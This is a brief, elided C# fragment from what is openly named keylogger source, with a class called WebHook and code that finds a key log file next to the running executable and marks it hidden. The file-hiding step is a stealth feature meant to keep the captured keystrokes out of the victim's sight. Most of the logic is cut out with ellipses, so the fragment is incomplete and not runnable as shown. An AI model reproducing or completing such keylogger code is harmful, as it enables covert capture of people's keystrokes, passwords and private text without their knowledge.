...
namespace KeyLogger
{
    public class WebHook : IDisposable
    {
        ...
        {
            var fi = new FileInfo(Path.Combine(Path.GetDirectoryName(Application.ExecutablePath), _keyFile));
            if (fi.Exists)
            {
            ...
            File.SetAttributes(fi.FullName, File.GetAttributes(fi.FullName) | FileAttributes.Hidden | FileAttributes.Compressed);
        }
